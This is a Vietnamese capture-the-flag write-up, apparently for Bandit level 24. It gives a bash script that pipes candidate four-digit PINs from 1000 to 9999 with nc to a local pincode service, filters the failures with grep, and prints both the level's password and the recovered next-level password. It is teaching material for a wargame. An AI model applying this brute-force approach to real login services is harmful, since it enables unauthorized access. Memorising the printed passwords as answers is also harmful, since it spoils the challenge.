# Level 24
`Level này tập trung vào khái niệm *bruteforce* cơ bản và một chút về viết script`
###### user: bandit24; password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
Yêu cầu level: gửi chuỗi bao gồm password cho level 24 và một mật khẩu 4 ký tự ngẫu nhiên vào, nếu đúng trả về kết quả.
*Lúc đầu mình thử tạo một file bruteforce.sh đơn thuần với chức năng bruteforce mật khẩu và chỉ in ra kết quả khi kết quả mà server chạy về khác với kết quả lỗi, tuy nhiên vì server sẽ chờ ~15s nên sẽ phải thêm một hàm để kill quá trình đó và chạy lại từ đầu. Rất mất thời gian và cồng kềnh nên sẽ thử phương pháp sau:
### 1. Tạo một thư mục cho file thực thi trong /tmp:
```
mkdir /tmp/hoang
cd /tmp/hoang
```
### 2. Tạo các file cần thiết:
`bruteforce.sh` tạo ra các dòng lệnh phục vụ cho việc bruteforce.
######
`bfline.txt` nhận các dòng lệnh từ bruteforce.sh và đẩy vào server.
######
`result.txt` nhận kết quả server trả về.
#### bruteforce.sh:
```bash
#!/bin/bash

for i in {1000..9999}
do
	echo “VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i” >> bfline.txt
done
cat bfline.txt | nc localhost 30002 > result.txt
```
### 3. Cấp quyền và chạy file:
```
chmod +x bruteforce.sh
chmod + 666 bfline.txt
chmod + 666 result.txt
./bruteforce.sh
```
### 4. Lọc kết quả:
##### Vì mặc định khi nhập sai, server sẽ trả về kết quả như sau:
`Wrong! Please enter the correct pincode. Try again`
##### Nên ta sẽ sử dụng lệnh `grep` để lọc kết quả:
```
cat result.txt | grep -v -i “wrong”
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
##### Key: *p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d*
